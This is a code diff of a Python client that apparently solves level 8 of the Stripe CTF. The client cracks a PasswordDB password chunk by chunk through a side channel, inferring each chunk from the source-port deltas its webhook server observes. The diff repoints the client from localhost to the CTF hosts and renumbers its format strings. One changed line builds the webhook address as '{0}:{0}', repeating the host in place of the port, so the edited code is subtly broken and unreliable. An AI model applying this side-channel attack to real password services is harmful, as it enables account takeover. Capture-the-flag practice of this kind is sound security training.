@@ -18,10 +18,10 @@ log = logging.getLogger(__name__)
 
 
 #: Public facing address
-SERVER_HOST = "127.0.0.1"
-SERVER_PORT = 50012
+SERVER_HOST = "level02-3.stripe-ctf.com"
+SERVER_PORT = 50112
 #: URL to the PasswordDB server API endpoint.
-PWDB_URL = "http://127.0.0.1:3000/"
+PWDB_URL = "https://level08-1.stripe-ctf.com/user-wviepjncvg/"
 
 
 # Synchronized queue for inter-thread communication
@@ -37,7 +37,7 @@ class RequestResult(object):
         self.success = None
 
     def __repr__(self):
-        return "<RequestResult(source_port={})>".format(self.source_port)
+        return "<RequestResult(source_port={0})>".format(self.source_port)
 
 
 class WebhookServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
@@ -119,7 +119,7 @@ class Client(object):
         return "".join(chunks)
 
     def run(self):
-        webhooks = ["{}:{}".format(SERVER_HOST, SERVER_PORT)]
+        webhooks = ["{0}:{0}".format(SERVER_HOST, SERVER_PORT)]
 
         while self.chunk < self.CHUNKS:
             pw = self.generate_pw()
@@ -130,11 +130,11 @@ class Client(object):
             result = it_queue.get()
 
             if result.success:
-                print("SUCCESS: {}".format(self.generate_pw()))
+                print("SUCCESS: {0}".format(self.generate_pw()))
                 return
 
             delta = self.delta_confirmer.confirm(result)
-            log.debug("delta={}, pw={}".format(delta, pw))
+            log.debug("delta={0}, pw={1}".format(delta, pw))
             # Not a stable data, run again.
             if delta < 1:
                 continue
@@ -147,14 +147,14 @@ class Client(object):
         if delta == (self.MIN_SOCKETS + self.chunk):
             self.counter += 1
         elif delta == (self.MIN_SOCKETS + self.chunk + 1):
-            log.info("Found chunk #{}. Current PW: {}".format(
+            log.info("Found chunk #{0}. Current PW: {1}".format(
                 self.chunk, self.generate_pw()))
             self.verified_chunks.append(str(self.counter))
             self.chunk += 1
             self.delta_confirmer.reset()
             self.weirdness /= 2
         else:
-            log.error("Weird delta={} at chunk={}. "
+            log.error("Weird delta={0} at chunk={1}. "
                           "Resetting current chunk state.".format(
                               delta, self.chunk))
             self.weirdness += 1
